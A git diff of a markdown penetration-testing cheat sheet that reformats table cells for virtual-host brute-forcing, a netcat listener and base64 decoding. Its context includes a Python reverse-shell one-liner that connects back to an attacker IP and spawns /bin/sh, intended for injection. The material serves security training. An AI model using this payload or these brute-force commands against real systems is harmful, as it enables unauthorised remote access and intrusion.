@@ -83,8 +83,7 @@ Searching for subdomains and other information on the sources provided in the so
 | Resource/Command                                                                                                                | Description                                                               |
 |---------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------|
 | ```curl -s http://192.168.10.10 -H "Host: randomtarget.com" ```                                                                       | Changing the HOST HTTP header to request a specific domain.               |
-| ```cat ./vhosts.list  while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address>            |                                                                           |
-| -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done``` |Bruteforcing for possible virtual hosts on the target domain.                                                                            |
+| ```cat ./vhosts.list  while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address>  -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done``` |Bruteforcing for possible virtual hosts on the target domain.   |                                                                         |
 | ```ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612```                                                   | Bruteforcing for possible virtual hosts on  the target domain using ffuf. |                                                             
 
 ### Crawling
@@ -254,8 +253,8 @@ Searching for subdomains and other information on the sources provided in the so
 
 | Command                                                                                                                                                                                                                                  | 	Description                                    |
 |------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------|
-| nc -lvnp 9090                                                                                                                                                                                                                            | 	Starting a netcat listener                     |
-| echo "\<B64 encoded response>" \| base64 -d                                                                                                                                                                                              | 	Decoding the base64 encoded response           |
+| ```nc -lvnp 9090  ```                                                                                                                                                                                                                          | 	Starting a netcat listener                     |
+| ```echo "\<B64 encoded response>" \| base64 -d   ```                                                                                                                                                                                           | 	Decoding the base64 encoded response           |
 | ```export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ``` | Reverse shell payload (to be URL encoded twice) |
 
 ### SSI Injection Exploitation Example
